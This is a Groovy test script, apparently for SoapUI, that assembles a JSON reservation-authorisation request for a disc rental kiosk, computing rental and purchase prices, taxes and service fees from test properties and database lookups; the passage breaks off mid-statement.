def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
testRunner.testCase.setPropertyValue("CardType",CardType);
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' );

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//ResvAuth
rentalBarcodes = [];
rentalTitleIds = [];
rentalProductFamily = [];
rentalProductType = [];
rentalDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
purchaseBarcodes = [];
purchaseProductFamily = [];
purchaseProductType = [];
purchaseDiscPrice = [];
purchaseTitleIds = [];
itemSourceType = [];

//MDV-Rental
updatedrentalMDVFlag = [];
updatedrentalMDVDiscNumber = [];

//MDV-Purchase
updatedpurchaseMDVFlag = [];
updatedpurchaseMDVDiscNumber = [];

rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
purchasePayload = "{\"GroupType\" :2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
rentalTitleIds = []; //will have both rental and purchase titleIds.
requestPayload = "";

def numAddRentals = context.expand( '${#TestCase#numOfRentals}' );
numAddRentalsList = numAddRentals.split(",");
def numAddPurchases = context.expand( '${#TestCase#numOfPurchases}' );
numAddPurchasesList = numAddPurchases.split(",");
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );

//Total rental and purchase count
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();;
log.info ("purchaseCount:$purchaseCount; rentalCount:$rentalCount")
EstimatedLoyaltyAmount = context.expand( '${#TestCase#EstimatedLoyaltyAmount}' )
if(rentalCount > 0)
{
	BigDecimal EstimatedLoyaltyAmount = EstimatedLoyaltyAmount.toBigDecimal();
}
else
{
	BigDecimal EstimatedLoyaltyAmount = 0;
}

//Discount and CreditCard payload
def discountPayload = context.expand( '${#TestCase#DiscountPayload}' );
def svcFeePayload = context.expand( '${#TestCase#ServiceFeePayload}' );
def ccPayload = context.expand( '${#TestCase#CCPayload}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );

//Rentala and Purchase disc info from Authorize
def purchaseBarcodes = context.expand( '${#TestCase#PurchaseBarcodes}' );
def purchaseTitleIds = context.expand( '${#TestCase#PurchaseTitleIds}' );
def purchaseProductFamily = context.expand( '${#TestCase#PurchaseProductFamily}' );
def purchaseProductType = context.expand( '${#TestCase#PurchaseProductType}' );
def purchaseDiscPrice = context.expand( '${#TestCase#PurchaseDiscPrice}' );

def resvBarcodes = context.expand( '${#TestCase#RentalBarcodes}' );
def resvTitleIds = context.expand( '${#TestCase#RentalTitleIds}' );
def resvProductFamily = context.expand( '${#TestCase#RentalProductFamily}' );
def resvProductType = context.expand( '${#TestCase#RentalProductType}' );
def resvDiscPrice = context.expand( '${#TestCase#RentalDiscPrice}' );
def resvNonReturnPrice = context.expand( '${#TestCase#RentalNonReturnPrice}' );
def resvNonReturnDays = context.expand( '${#TestCase#RentalNonReturnDays}' );
//def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' ); 
//def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );

//MDV
def rentalMDVFlag = context.expand( '${#TestCase#RentalMDVFlag}' )
def rentalMDVDiscNumber = context.expand( '${#TestCase#RentalMDVDiscNumber}' )
def purchaseMDVFlag = context.expand( '${#TestCase#PurchaseMDVFlag}' )
def purchaseMDVDiscNumber = context.expand( '${#TestCase#PurchaseMDVDiscNumber}' )

purchaseBarcodesList = purchaseBarcodes.split(",");
purchaseTitleIdsList = purchaseTitleIds.split(",");
purchaseProductFamilyList = purchaseProductFamily.split(",");
purchaseProductTypeList = purchaseProductType.split(",");
purchaseDiscPriceList = purchaseDiscPrice.split(",");
//purchaseVendStatusList = purchaseVendStatus.split(","); //TO-DO
rentalBarcodesList = resvBarcodes.split(",");
rentalTitleIdsList = resvTitleIds.split(",");
rentalProductFamilyList = resvProductFamily.split(",");
rentalProductTypeList = resvProductType.split(",");
rentalDiscPriceList = resvDiscPrice.split(",");
rentalNonReturnPriceList = resvNonReturnPrice.split(",");
rentalNonReturnDaysList = resvNonReturnDays.split(",");
//rentalVendStatusList = rentalVendStatus.split(","); //TO-DO
//MDV
rentalMDVFlagList = rentalMDVFlag.split(",");
rentalMDVDiscNumberList = rentalMDVDiscNumber.split(",");
purchaseMDVFlagList = purchaseMDVFlag.split(",");
purchaseMDVDiscNumberList = purchaseMDVDiscNumber.split(",");
//Build Reco Payload
def numOfRecos = Eval.me("[" + context.expand( '${#TestCase#numOfRecos}' ) + "]");
def recoFormats = context.expand( '${#TestCase#recoFormats}' );
recoFormatsList = recoFormats.split(",");
if (recoFormatsList.size() != numOfRecos.size())
{
    def difference = (recoFormatsList.size() - numOfRecos.size())
     for (di = 0; di < difference; di++)
     {
         numOfRecos.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else
{
     //nothing to do, code looks good
}

numOfRecosList = numOfRecos.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
log.info ("numOfRecos: $numOfRecos; recoFormatsList: $recoFormatsList");
if ((recoFormats == '0') || (recoFormats == '') || (recoFormats == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
	testRunner.testCase.setPropertyValue("HasPromoDiscount","0");
	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < recoFormatsList.size(); r++)
	{
	    curformatID = recoFormatsList[r].toString().trim();
	    //log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', resvTitleIds);    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    getDisctc.setPropertyValue('IsMDV','0');
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	//Will Grab one format a time to build the request.
	for (f = 0; f < recoFormatsList.size(); f++)
	{
	    curformatID = recoFormatsList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numOfRecosList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	
	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"VendStatus\" : 28," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	        rentalPayload += "\"MultiDisc\" : false,"
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 0,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $dvdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $dvdPrice"
			
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
			rentalDiscPrice.add(dvdPrice);
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $blurayPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $blurayPrice"
			
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
	        }
	        else //For Games
	        {
			rentalPayload += "\"InitialNight\" : $gamePrice,"
			rentalPayload += "\"ExtraNight\" : $gamePrice,"
			rentalPayload += "\"NonReturn\" : $gameNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $gamePrice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $gamePrice,"
			rentalPayload += "\"DefaultExtraNight\" : $gamePrice"
			
			//Calculate Rental Total
			rentalTotal += (gamePrice.toBigDecimal());
			rentalDiscPrice.add(gamePrice);
			rentalNonReturnPrice.add(gameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
	        }
	          //rentalPayload += ",\"SourceType\" : 1"  //NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
			rentalPayload += "}," 
			rentalPayload += "\"BlurayUpsell\" : null,"
			//rentalPayload += "\"ItemSourceType\" : 1"
			rentalPayload += "\"SourceType\" : 1"
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			itemSourceType.add(1);
			updatedrentalMDVFlag.add(false);
			updatedrentalMDVDiscNumber.add(null);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
		
	    }	    
	    if (f+1 < recoFormatsList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());   	    
	}

}
//Seperation between Reco Payload and Rental Payload
rentalPayload += ","

//Build Rental Payload
if (rentalCount <= 0)
{
	log.info ("No Rentals in the transaction");
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
}
else
{
	for (r = 0; r < rentalBarcodesList.size(); r++)
	{				
		currentalBarcodeId = rentalBarcodesList[r].toString().trim();
		currentalTitleId = rentalTitleIdsList[r].toString().trim();
		currentalProductFamily = rentalProductFamilyList[r].toString().trim();
		currentalProductType = rentalProductTypeList[r].toString().trim();
		currentalDiscPrice = rentalDiscPriceList[r].toString().trim();
		currentalNonReturnPrice = rentalNonReturnPriceList[r].toString().trim();
		currentalNonReturnDays = rentalNonReturnDaysList[r].toString().trim();
		//currentalVendStatus = rentalVendStatusList[r].toString().trim();

		//MDV
		curRentalMDVFlag = rentalMDVFlagList[r].toString().trim();
		curRentalMDVDiscNumber = rentalMDVDiscNumberList[r].toString().trim();
		
		rentalPayload += "{"
		rentalPayload += "\"ProductId\" : $currentalTitleId,"
		rentalPayload += "\"Barcode\" : \"$currentalBarcodeId\","
		rentalPayload += "\"VendStatus\" : 0," //To-DO
		rentalPayload += "\"ProductFamily\" : \"$currentalProductFamily\","
		rentalPayload += "\"ProductType\" : \"$currentalProductType\","
		rentalPayload += "\"MultiDisc\" : $curRentalMDVFlag,"
		rentalPayload += "\"DiscNumber\" : $curRentalMDVDiscNumber,"
		rentalPayload += "\"Pricing\" : {"
		rentalPayload += "\"InitialNight\" : $currentalDiscPrice,"
		rentalPayload += "\"ExtraNight\" : $currentalDiscPrice,"
		rentalPayload += "\"NonReturn\" : $currentalNonReturnPrice,"
		rentalPayload += "\"Expiration\" : $currentalDiscPrice,"
		rentalPayload += "\"NonReturnDays\" : $currentalNonReturnDays,"
		rentalPayload += "\"PriceSetId\" : 0,"
		rentalPayload += "\"Purchase\" : 0,"
		//Added a part of ProductPricing for BI; harcoded for the time being.
		rentalPayload += "\"ProductPriceId\" : 0,"
		rentalPayload += "\"InitialDays\" : 1,"
		rentalPayload += "\"DefaultInitialNight\" : $currentalDiscPrice,"
		rentalPayload += "\"DefaultExtraNight\" : $currentalDiscPrice"
		rentalPayload += "}," 
		rentalPayload += "\"BlurayUpsell\" : null,"
		//rentalPayload += "\"ItemSourceType\" : 3"
		rentalPayload += "\"SourceType\" : 0"
		rentalPayload += "}" 


		if (r+1 < rentalBarcodesList.size())
		{
		   rentalPayload += ","
		} 
		rentalTotal += (currentalDiscPrice.toBigDecimal());
		rentalBarcodes.add(currentalBarcodeId);
		rentalTitleIds.add(currentalTitleId);
		rentalProductFamily.add(currentalProductFamily);
		rentalProductType.add(currentalProductType);
		rentalDiscPrice.add(currentalDiscPrice);
		rentalNonReturnPrice.add(currentalNonReturnPrice);
		rentalNonReturnDays.add(currentalNonReturnDays);
		itemSourceType.add(0);
		updatedrentalMDVFlag.add(curRentalMDVFlag);
		updatedrentalMDVDiscNumber.add(curRentalMDVDiscNumber);

		testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
		testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());
		testRunner.testCase.setPropertyValue('ItemSourceType', itemSourceType.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalMDVFlag', updatedrentalMDVFlag.join(",").toString());
		testRunner.testCase.setPropertyValue('RentalMDVDiscNumber', updatedrentalMDVDiscNumber.join(",").toString());
	}
	
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal())
	
	if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	if (discountedSubTotal < 0)
	{
		discountedSubTotal = 0
	}
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ", \"Subtotal\" : " + rentalTotal + ", \"DiscountedSubtotal\" : " + discountedSubTotal + ", \"TaxAmount\" : \"" + rentalTaxAmt + "\", \"GrandTotal\" : " + grandTotal + " } }";
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	rentalTotal = grandTotal;//Defining it to calculate Total Amount
}

//Purchase payload
if (purchaseCount <= 0)
{
	log.info ("No Purchases in the transaction");
	//testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
}
else
{
	for (p = 0; p < purchaseBarcodesList.size(); p++)
	{				
		curpurchaseBarcode = purchaseBarcodesList[p].toString().trim();
		curpurchaseTitleIds = purchaseTitleIdsList[p].toString().trim();
		curpurchaseProductFamily = purchaseProductFamilyList[p].toString().trim();
		curpurchaseProductType = purchaseProductTypeList[p].toString().trim();
		curpurchaseDiscPrice = purchaseDiscPriceList[p].toString().trim();
		curpurchaseVendStatus = purchaseVendStatusList[p].toString().trim();
		//MDV
		curPurchaseMDVFlag = purchaseMDVFlagList[p].toString().trim();
		curPurchaseMDVDiscNumber = purchaseMDVDiscNumberList[p].toString().trim();
		
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curpurchaseTitleIds,"
		purchasePayload += "\"Barcode\" : \"$curpurchaseBarcode\","
		purchasePayload += "\"VendStatus\" : \"$curpurchaseVendStatus\"," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$curpurchaseProductFamily\","
		purchasePayload += "\"ProductType\" : \"$curpurchaseProductType\","
		purchasePayload += "\"MultiDisc\" : $curPurchaseMDVFlag,"
		purchasePayload += "\"DiscNumber\" : $curPurchaseMDVDiscNumber,"
		purchasePayload += "\"Pricing\" : {"
		purchasePayload += "\"InitialNight\" : 0,"
		purchasePayload += "\"ExtraNight\" : 0,"
		purchasePayload += "\"NonReturn\" : 0,"
		purchasePayload += "\"Purchase\" : $curpurchaseDiscPrice,"
		purchasePayload += "\"Expiration\" : 0,"
		purchasePayload += "\"NonReturnDays\" : 0,"
		purchasePayload += "\"PriceSetId\" : 0,"
		//Added a part of ProductPricing for BI; harcoded for the time being.
		purchasePayload += "\"ProductPriceId\" : 0,"
		purchasePayload += "\"InitialDays\" : null,"
		purchasePayload += "\"DefaultInitialNight\" : null,"
		purchasePayload += "\"DefaultExtraNight\" : null"
		purchasePayload += "}," 
		purchasePayload += "\"BlurayUpsell\" : null,"
		purchasePayload += "\"SourceType\" : 3"
		purchasePayload += "}"

		if (p+1 < purchaseBarcodesList.size())
		{
		   purchasePayload += ","
		}
		//Capture vended rentals count and non-vended dics.
		if (curpurchaseVendStatus.equals("Vended")) 
		{
			if (curpurchaseProductType == "DigitalCode")
			{
				//Capture Amount of the Disc (DigitalCode)
				digitalTotal += (curpurchaseDiscPrice.toBigDecimal());
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				testRunner.testCase.setPropertyValue("BarcodeForTnx", curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
			else
			{
				//Capture Amount of the Disc (Regular Purchase)
				purchaseTotal += (curpurchaseDiscPrice.toBigDecimal());
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				testRunner.testCase.setPropertyValue("BarcodeForTnx", curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedPurchaseBarcodes.add(curpurchaseBarcode);
			testRunner.testCase.setPropertyValue("NonVendedBarcodeForTnx", curpurchaseBarcode);
		}
	}
	

	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	
	def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}');
	// add totals to the strings
	purchasePayload += "], \"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#PurchaseTaxRate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : " + totalPurchaseTotal + ",";
	purchasePayload += "\"DiscountedSubtotal\" : " + totalPurchaseTotal + ",";
	purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"GrandTotal\" : " + purchaseGrandTotal + " } }";
	
	// add totals to the strings
	//purchasePayload += "], \"Totals\" : { \"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", \"Subtotal\" : " + totalPurchaseTotal + ", \"DiscountedSubtotal\" : " + totalPurchaseTotal + ", \"TaxAmount\" : \"" + totalTaxAmount + "\", \"GrandTotal\" : " + purchaseGrandTotal + " } }";
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
//log.info ("purchasePayload: $purchasePayload; rentalPayload: $rentalPayload");
TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());

//ServiceFee
serviceFeePayload = "";
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}');
def serviceFeeTaxRate = context.expand( '${#TestCase#ServiceFeeTaxRate}');
def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}');
if (enableServiceFee == 'true')
{		
	if (serviceFeePayload != '')
	{
		serviceFeePayload += svcFeePayload
	}
	else
	{
		serviceFeePayload += ",\"ServiceFee\": {";
		serviceFeePayload += "\"DefaultAmount\": \"$serviceFeeAmount\",";
		serviceFeePayload += "\"TaxRate\": $serviceFeeTaxRate,";
		if (TransactionTotal > 0)
		{
			serviceFeePayload += "\"ActualAmount\": \"$serviceFeeAmount\",";
			BigDecimal serviceFeeTaxAmt = ((serviceFeeAmount).toBigDecimal()) * ((serviceFeeTaxRate).toBigDecimal()/100);
			serviceFeeTaxAmt = Round16.format(serviceFeeTaxAmt).toBigDecimal();
			serviceFeePayload += "\"TaxAmount\": \"$serviceFeeTaxAmt\" }";
		}
		else
		{
			serviceFeePayload += "\"ActualAmount\": \"0.00\",";
			serviceFeePayload += "\"TaxAmount\": \"0.00\" }";
		}
	}
	
}
else
{
	log.info ("NO ServiceFee enabled");
}
testRunner.testCase.setPropertyValue("ServiceFeePayload",serviceFeePayload);



def MessageId = UUID.randomUUID().toString();
def PromoCode = context.expand( '${#TestCase#PromoCode}');
def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));
def Email = context.expand( '${#TestCase#Email}');
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def TransactionID = context.expand( '${#TestCase#TransactionID}');
def ReferenceNumber = context.expand( '${#TestCase#ReferenceNumber}');

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"ResvAuth\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.27.1.297\",";
requestPayload += "\"BundleVersion\": \"2.27.1.65\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"UseCredits\": \"0\",";
requestPayload += "\"ReferenceNumber\": $ReferenceNumber,";
requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
